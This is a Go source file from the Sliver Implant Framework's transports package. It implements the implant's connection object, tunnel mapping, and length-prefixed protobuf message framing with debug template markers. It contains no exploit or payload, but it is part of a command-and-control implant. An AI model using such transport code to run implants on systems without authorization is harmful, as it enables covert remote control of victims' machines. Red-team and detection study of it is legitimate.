package transports

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"fmt"
	"log"

	// {{end}}

	"bytes"
	"encoding/binary"
	"io"
	insecureRand "math/rand"
	"net"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	readBufSize = 16 * 1024 // 16kb
)

// Connection - Abstract connection to the server
type Connection struct {
	Send    chan *pb.Envelope
	Recv    chan *pb.Envelope
	IsOpen  bool
	Done    chan bool
	once    *sync.Once
	tunnels *map[uint64]*Tunnel
	stream  io.ReadWriteCloser // Might be empty

	// Closing details
	cleanup func() // User can pass this when instantiating a connection
	mutex   *sync.RWMutex
}

func NewConnection() *Connection {
	connection := &Connection{
		Send:    make(chan *pb.Envelope),
		Recv:    make(chan *pb.Envelope),
		Done:    make(chan bool, 1),
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
	}

	return connection
}

// Cleanup - Execute default & user-provided cleanups once
func (c *Connection) Cleanup() {
	c.once.Do(func() {
		// This might help components to notice its time
		// to stop using us, a little ahead of time just in case.
		// c.Done <- true

		// Close the envelopes channels
		// Don't always close Send, because some protocols
		// in some cases might leave room to keep writing.
		close(c.Recv)

		// When there is an underlying stream, close
		if c.stream != nil {
			c.stream.Close()
		}
		// And perform any actions that the
		// user might have provided
		if c.cleanup != nil {
			c.cleanup()
		}
		c.IsOpen = false
	})
}

// Tunnel - Duplex byte read/write
type Tunnel struct {
	ID uint64

	Reader       io.ReadCloser
	ReadSequence uint64

	Writer        io.WriteCloser
	WriteSequence uint64
}

func init() {
	insecureRand.Seed(time.Now().UnixNano())
}

// Tunnel - Add tunnel to mapping
func (c *Connection) Tunnel(ID uint64) *Tunnel {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return (*c.tunnels)[ID]
}

// AddTunnel - Add tunnel to mapping
func (c *Connection) AddTunnel(tun *Tunnel) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	(*c.tunnels)[tun.ID] = tun
}

// RemoveTunnel - Add tunnel to mapping
func (c *Connection) RemoveTunnel(ID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	delete(*c.tunnels, ID)
}

func (c *Connection) RequestSend(envelope *pb.Envelope) {
	c.Send <- envelope
	return
}

func (c *Connection) RequestResend(data []byte) {
	c.Send <- &pb.Envelope{
		Type: pb.MsgTunnelData,
		Data: data,
	}
}

// RequestRecv - Returns a channel over which we listen for incoming envelopes
func (c *Connection) RequestRecv() chan *pb.Envelope {
	return c.Recv
}

// SetupConnectionStream - Create a primitive ReadWriteCloser on our goroutines (to rule them all)
func SetupConnectionStream(stream io.ReadWriteCloser, userCleanup func()) (*Connection, error) {

	send := make(chan *pb.Envelope, 100)
	recv := make(chan *pb.Envelope, 100)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		Done:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: userCleanup,
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			streamWriteEnvelope(stream, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := streamReadEnvelope(stream)
			if err == io.EOF {
				fmt.Println(err)
				break
			}
			if err == net.ErrClosed {
				break
			}
			if err == nil {
				recv <- envelope
			}
		}
	}()

	return connection, nil
}

const (
	readBufSizeNamedPipe  = 1024
	writeBufSizeNamedPipe = 1024
)

// func streamWriteEnvelope(conn io.ReadWriteCloser, envelope *sliverpb.Envelope) error {
//         // func writeEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
//         data, err := proto.Marshal(envelope)
//         if err != nil {
//                 // {{if .Config.Debug}}
//                 log.Print("[namedpipe] Marshaling error: ", err)
//                 // {{end}}
//                 return err
//         }
//         dataLengthBuf := new(bytes.Buffer)
//         binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
//         _, err = conn.Write(dataLengthBuf.Bytes())
//         if err != nil {
//                 // {{if .Config.Debug}}
//                 log.Printf("[namedpipe] Error %s and %d\n", err, dataLengthBuf)
//                 // {{end}}
//         }
//         totalWritten := 0
//         for totalWritten < len(data)-writeBufSizeNamedPipe {
//                 n, err2 := conn.Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
//                 totalWritten += n
//                 if err2 != nil {
//                         // {{if .Config.Debug}}
//                         log.Printf("[namedpipe] Error %s\n", err)
//                         // {{end}}
//                 }
//         }
//         if totalWritten < len(data) {
//                 missing := len(data) - totalWritten
//                 _, err := conn.Write(data[totalWritten : totalWritten+missing])
//                 if err != nil {
//                         // {{if .Config.Debug}}
//                         log.Printf("[namedpipe] Error %s", err)
//                         // {{end}}
//                 }
//         }
//         return nil
// }

// streamWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func streamWriteEnvelope(stream io.ReadWriteCloser, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	stream.Write(dataLengthBuf.Bytes())
	stream.Write(data)
	return nil
}

func socketWritePing(stream io.ReadWriteCloser) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&sliverpb.Ping{Nonce: 31337})
	envelope := sliverpb.Envelope{
		Type: sliverpb.MsgPing,
		Data: pingBuf,
	}
	return streamWriteEnvelope(stream, &envelope)
}

// streamReadEnvelope - Reads a message from the TLS connection using length prefix framing
func streamReadEnvelope(stream io.ReadWriteCloser) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(dataLengthBuf) == 0 || stream == nil {
		panic("[[GenerateCanary]]")
	}
	_, err := stream.Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, net.ErrClosed // TODO:change this with an analysis of the error
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	// readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		// Compute the precise length of the temporary buffer
		var readBuf []byte
		if dataLength-len(dataBuf) > readBufSize {
			readBuf = make([]byte, readBufSize)
		} else {
			readBuf = make([]byte, (dataLength - len(dataBuf)))
		}

		// And read it
		n, err := stream.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}
